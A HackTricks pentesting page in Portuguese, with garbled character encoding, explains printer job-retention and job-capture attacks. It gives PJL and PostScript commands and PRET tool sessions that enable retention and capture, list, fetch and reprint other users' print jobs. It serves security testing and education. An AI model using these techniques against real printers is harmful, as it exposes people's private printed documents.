<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira [**produtos oficiais PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# RetenÃ§Ã£o de Trabalho

Algumas impressoras possuem trabalhos de impressÃ£o armazenados acessÃ­veis a partir do servidor web. Geralmente, no entanto, a retenÃ§Ã£o de trabalhos deve ser ativada explicitamente para um determinado trabalho de impressÃ£o e pode ser feita usando comandos PJL padrÃ£o ou cÃ³digo PostScript proprietÃ¡rio. Os trabalhos sÃ£o entÃ£o mantidos na memÃ³ria e podem ser reimpressos a partir do painel de controle.

## PJL

A retenÃ§Ã£o de trabalho legÃ­tima pode ser ativada para o documento atual definindo a variÃ¡vel PJL HOLD conforme mostrado abaixo:
```
@PJL SET HOLD=ON
[actual data to be printed follows]
```
Os trabalhos retidos sÃ£o mantidos na memÃ³ria e podem ser reimpressos a partir do painel de controle da impressora. Essa funcionalidade Ã© suportada por vÃ¡rias impressoras, no entanto, parece que apenas alguns dispositivos Epson permitem que a retenÃ§Ã£o permanente de trabalhos seja definida usando `@PJL DEFAULT HOLD=ON`.

**Como testar esse ataque?**

Use o comando `hold` do [**PRET**](https://github.com/RUB-NDS/PRET) no modo pjl e verifique se a retenÃ§Ã£o permanente de trabalhos pode ser definida:
```
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> hold
Setting job retention, reconnecting to see if still enabled
Retention for future print jobs: OFF
```
## PostScript

O PostScript oferece funcionalidade semelhante, mas Ã© especÃ­fico para modelo e fornecedor. Para as sÃ©ries HP LaserJet 4k e vÃ¡rias impressoras Kyocera, a retenÃ§Ã£o de trabalhos pode ser ativada adicionando os seguintes comandos a um documento PostScript:
```
<< /Collate true /CollateDetails
<< /Hold 1 /Type 8 >> >> setpagedevice
```
Embora seja teoricamente possÃ­vel habilitar permanentemente a retenÃ§Ã£o de trabalhos PostScript usando o operador [startjob](./#postscript-ps), essa configuraÃ§Ã£o Ã© explicitamente redefinida pelo CUPS no inÃ­cio de cada trabalho de impressÃ£o usando `<< /Collate false >> setpagedevice`. Para contrariar esse mecanismo de proteÃ§Ã£o, no entanto, o atacante pode redefinir permanentemente o operador `setpagedevice` para nÃ£o ter efeito algum.

**Como testar esse ataque?**

Use o comando `hold` do [**PRET**](https://github.com/RUB-NDS/PRET) no modo ps:
```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> hold
Job retention enabled.
```
# Captura de Trabalho

Ã‰ possÃ­vel, embora incomum, ativar a retenÃ§Ã£o de trabalhos na caixa de diÃ¡logo de impressÃ£o, conforme discutido acima. No entanto, com o PostScript, Ã© possÃ­vel ter acesso completo ao trabalho de impressÃ£o atual e, com o operador [startjob](./#postscript-ps), Ã© possÃ­vel atÃ© mesmo sair do loop do servidor e acessar trabalhos futuros. Tal funcionalidade tem o potencial de capturar todos os documentos se o PostScript for usado como driver de impressora.

## PostScript

Com a capacidade de se conectar a operadores PostScript arbitrÃ¡rios, Ã© possÃ­vel manipular e acessar trabalhos de impressÃ£o estrangeiros. Para **analisar o fluxo de dados real enviado para a impressora**, pode-se aplicar um recurso interessante da linguagem PostScript: ler seu prÃ³prio cÃ³digo de programa como dados usando o operador `currentfile`. Dessa forma, todo o fluxo de dados a ser processado pelo interpretador PostScript pode ser acessado por leitura e armazenado em um arquivo no dispositivo da impressora. Se a impressora nÃ£o oferecer acesso ao sistema de arquivos, **os documentos capturados podem ser armazenados na memÃ³ria**, por exemplo, dentro de dicionÃ¡rios PostScript permanentes. \
Um problema prÃ¡tico Ã© decidir **qual operador deve ser conectado**, jÃ¡ que nÃ£o se tem acesso ao fluxo de dados atÃ© que esse operador seja processado pelo interpretador PostScript. Como um atacante deseja capturar trabalhos de impressÃ£o desde o inÃ­cio, o **operador redefinido deve ser o primeiro operador** contido no documento PostScript. Felizmente, todos os documentos impressos com o CUPS sÃ£o pressionados em uma estrutura fixa que comeÃ§a com `currentfile /ASCII85Decode filter /LZWDecode filter cvx exec`. Com base na suposiÃ§Ã£o de tal estrutura fixa, o atacante pode capturar documentos desde o inÃ­cio e executar (ou seja, imprimir) o arquivo posteriormente. Para sistemas de impressÃ£o **diferentes do CUPS**, esse ataque tambÃ©m deve ser possÃ­vel, mas **os operadores precisam ser adaptados**. Observe que o cabeÃ§alho PostScript, que geralmente inclui o tamanho da mÃ­dia, o usuÃ¡rio e os nomes dos trabalhos, nÃ£o pode ser capturado usando este mÃ©todo, porque primeiro nos conectamos no inÃ­cio do documento real. Outra estratÃ©gia genÃ©rica para se conectar no inÃ­cio de cada trabalho de impressÃ£o Ã© definir o parÃ¢metro do sistema `BeginPage`, se suportado pela impressora (a maioria das impressoras faz isso). Essa vulnerabilidade provavelmente estÃ¡ presente em dispositivos de impressÃ£o hÃ¡ dÃ©cadas, pois apenas construÃ§Ãµes de linguagem definidas pelo padrÃ£o PostScript sÃ£o abusadas.

Use o comando `capture` do [**PRET**](https://github.com/RUB-NDS/PRET) no modo ps:
```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.

printer:/> capture 
Print job operations:  capture <operation>
  capture start   - Record future print jobs.
  capture stop    - End capturing print jobs.
  capture list    - Show captured print jobs.
  capture fetch   - Save captured print jobs.
  capture print   - Reprint saved print jobs.
printer:/> capture start
Future print jobs will be captured in memory!
printer:/> exit
```
Agora, imprima documentos arbitrÃ¡rios (certifique-se de que o PRET estÃ¡ desconectado para nÃ£o bloquear o canal de impressÃ£o). Depois, vocÃª pode listar, buscar ou reimprimir documentos capturados:
```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> capture list
Free virtual memory: 16.6M | Limit to capture:  5.0M
date          size  user           jobname                 creator             
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Jan 25 18:38  3.1M  -              -                       -                   
Jan 25 18:40  170K  -              -                       -                   
printer:/> capture fetch
Receiving capture/printer/690782792
3239748 bytes received. 
Receiving capture/printer/690646210
174037 bytes received.
printer:/> capture print
printing...
printing...
2 jobs reprinted
printer:/> capture stop
Stopping job capture, deleting recorded jobs
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
